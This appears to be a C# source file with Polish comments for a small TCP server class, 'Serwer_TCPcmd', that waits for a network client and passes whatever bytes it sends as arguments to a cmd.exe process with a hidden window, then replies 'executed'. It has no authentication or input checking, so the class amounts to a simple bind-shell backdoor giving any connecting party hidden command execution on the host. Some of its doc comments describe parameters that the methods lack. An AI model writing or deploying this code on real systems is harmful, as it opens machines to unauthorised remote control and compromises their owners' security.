﻿
using System.Net;
using System.Net.Sockets;
using System.Text;


namespace Serwer_TCPcmd
{
    public abstract class Serwer_TCPcmd
    {
        #region zmienne
        protected TcpListener server;
        protected TcpClient client;
        protected NetworkStream stream;

        protected byte[] buffer = new byte[2048];
        private int length;

        protected System.Diagnostics.Process process;
        protected System.Diagnostics.ProcessStartInfo startInfo;
        #endregion

#region funkcje publiczne

        /// <summary>
        /// Funkcja oczekuje na połączenie
        /// oraz przygotowuje potok do transmisji
        /// </summary>
        /// 
        /// /// <param name="adresIP"></param>
        /// nasłuchiwanie za klientem o podanym 
        /// adresie IP [adresIP] 
        /// 
        /// <param name="port"></param>
        /// nasłuchiwanie na
        /// podanym konkretnym porcie [port]
        protected void AcceptClient()
        { 
            client = server.AcceptTcpClient();
            stream = client.GetStream();
        }



        /// <summary>
        /// Sczytuje ze streamu przesłane dane
        /// oraz od razu wczytuje je do argumentu 
        /// procesu który ma wykonać to polecenie
        /// </summary>
        protected void ReadStream()
        {
            length = stream.Read(buffer, 0, 1024);

            startInfo.Arguments = System.Text.Encoding.UTF8.GetString(buffer, 0, length);
            process.StartInfo = startInfo;

        }

        /// <summary>
        /// Rozpoczyna egzekucję nowego procesu
        /// który wykona wcześniej przepisane z bufora 
        /// polecenie w konsoli wiersza poleceń systemu
        /// </summary>
        protected void ExecuteCommand()
        {

            process.Start();
            process.Close();


            stream.Write(Encoding.UTF8.GetBytes("executed" + System.Environment.NewLine), 0,
                Encoding.UTF8.GetBytes("executed" + System.Environment.NewLine).Length);

        }

        /// <summary>
        /// Konstruktor tworzący serwer i rozpoczynający od razu
        /// nasłuchiwanie, zatrzymuje się na nim
        /// aż do połączenia z klientem
        /// 
        /// </summary>
        /// <param name="adresIP"></param>
        /// nasłuchiwanie za klientem o podanym 
        /// adresie IP [adresIP] 
        /// 
        /// <param name="port"></param>
        /// nasłuchiwanie na
        /// podanym konkretnym porcie [port]

        public Serwer_TCPcmd()
        { }

        public Serwer_TCPcmd(IPAddress adres, int port)
        {
            server = new TcpListener(adres, port);
            server.Start();
            AcceptClient();

            process = new System.Diagnostics.Process();
            startInfo = new System.Diagnostics.ProcessStartInfo
            {
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = ""
            };

            process.StartInfo = startInfo;
        }
#endregion

    }
}
